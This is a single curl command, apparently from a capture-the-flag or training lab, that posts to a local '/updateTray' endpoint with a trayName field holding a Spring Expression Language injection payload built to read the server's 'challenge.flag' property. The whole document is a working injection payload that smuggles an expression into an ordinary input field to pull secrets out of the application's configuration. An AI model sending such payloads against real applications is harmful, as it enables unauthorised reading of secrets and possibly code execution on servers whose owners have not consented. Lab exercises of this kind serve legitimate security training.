curl -X POST http://localhost:3000/updateTray \
     -d 'trayName=${@environment.getProperty("challenge.flag")}' \
     -i